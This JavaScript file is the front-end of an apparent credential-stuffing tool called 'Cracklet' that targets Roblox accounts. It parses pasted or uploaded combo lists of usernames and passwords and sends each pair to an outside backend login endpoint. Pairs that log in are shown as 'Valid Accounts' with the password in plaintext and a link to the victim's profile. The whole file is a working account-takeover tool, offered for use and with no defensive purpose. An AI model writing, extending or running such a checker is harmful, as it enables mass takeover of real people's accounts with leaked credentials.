let app = document.getElementById('app');
let userName = localStorage.getItem('username') || null;
let format = { site: -1, username: -1, password: -1 };
let parsedLines = [];

const BACKEND_URL = 'https://cracklet-backend.vercel.app/api/login';

function renderNameScreen() {
  app.innerHTML = `
    <div class="name-screen">
      <h1>Enter your name...</h1>
      <input id="nameInput" placeholder="Enter your name...">
      <button onclick="saveName()">Continue</button>
    </div>
  `;
}

function saveName() {
  const name = document.getElementById('nameInput').value.trim();
  if (name) {
    localStorage.setItem('username', name);
    userName = name;
    renderMainScreen();
  }
}

function renderMainScreen() {
  app.innerHTML = `
    <div class="main-screen">
      <h1>Hello, <span class="green">${userName}</span></h1>

      <textarea id="credInput" rows="8" cols="50" placeholder="Paste your credentials here..."></textarea><br>
      <input type="file" id="fileInput"><br>
      <button onclick="previewData()">Preview & Assign Format</button>

      <div id="previewArea"></div>
      <div id="siteSelect" class="hidden">
        <h2>Site: Roblox</h2>
        <button onclick="validateCredentials()">Validate Credentials</button>
        <div id="progress" style="margin-top: 10px;"></div>
      </div>
      <div id="results"></div>
    </div>
  `;
}

function previewData() {
  let input = document.getElementById('credInput').value.trim();
  const file = document.getElementById('fileInput').files[0];

  if (file) {
    const reader = new FileReader();
    reader.onload = e => {
      input = e.target.result;
      processPreview(input);
    };
    reader.readAsText(file);
  } else {
    processPreview(input);
  }
}

function processPreview(data) {
  parsedLines = data.split('\n').filter(line => line.includes(':') || line.includes(',') || line.includes('|'));
  if (parsedLines.length === 0) return alert('No valid lines found.');

  const delimiter = parsedLines[0].includes(':') ? ':' :
                    parsedLines[0].includes(',') ? ',' : '|';

  const firstFew = parsedLines.slice(0, 3);
  const firstTokens = firstFew[0].split(delimiter);
  let previewHTML = `<h2>Assign Format:</h2><div class="preview-line">`;

  firstTokens.forEach((token, idx) => {
    previewHTML += `
      <div style="display: inline-block; margin: 5px;">
        <div class="token">${token}</div>
        <select onchange="setFormat(${idx}, this.value)">
          <option value="">None</option>
          <option value="username">Username</option>
          <option value="password">Password</option>
          <option value="site">Site</option>
        </select>
      </div>
    `;
  });

  previewHTML += `</div><pre style="margin-top:1rem; text-align:left;">${firstFew.join('\n')}</pre>`;

  document.getElementById('previewArea').innerHTML = previewHTML;
  document.getElementById('siteSelect').classList.remove('hidden');
}

function setFormat(index, role) {
  for (let key in format) {
    if (format[key] === index) format[key] = -1;
  }
  if (role) format[role] = index;
}

async function validateCredentials() {
  const delimiter = parsedLines[0].includes(':') ? ':' :
                    parsedLines[0].includes(',') ? ',' : '|';
  const valid = [], invalid = [];

  const total = parsedLines.length;
  let checked = 0;

  for (const line of parsedLines) {
    const parts = line.split(delimiter);
    const username = parts[format.username]?.trim();
    const password = parts[format.password]?.trim();

    if (!username || !password) continue;

    try {
      const res = await fetch(BACKEND_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      });
      const data = await res.json();

      if (data.success) {
        valid.push({ username, password, userId: data.userId });
      } else {
        invalid.push({ username, password });
      }
    } catch (e) {
      invalid.push({ username, password });
    }

    checked++;
    document.getElementById('progress').innerText = `Checked: ${checked}/${total}`;
  }

  renderResults(valid, invalid);
}

function renderResults(valid, invalid) {
  let html = `<h2>✅ Valid Accounts</h2>`;
  valid.forEach(user => {
    html += resultCard(user, 'green');
  });

  html += `<h2>❌ Invalid Accounts</h2>`;
  invalid.forEach(user => {
    html += resultCard(user, 'red');
  });

  document.getElementById('results').innerHTML = html;
}

function resultCard(user, colorClass) {
  const avatarUrl = user.userId
    ? `https://www.roblox.com/headshot-thumbnail/image?userId=${user.userId}&width=150&height=150&format=png`
    : `https://via.placeholder.com/150`;

  return `
    <div class="result-card">
      <img src="${avatarUrl}">
      <div>
        <a href="https://www.roblox.com/users/${user.userId || '#'}" target="_blank" class="${colorClass}">
          ${user.username}
        </a><br>
        <span class="password" onclick="this.classList.toggle('visible')">${user.password}</span>
      </div>
    </div>
  `;
}

// Init
userName ? renderMainScreen() : renderNameScreen();
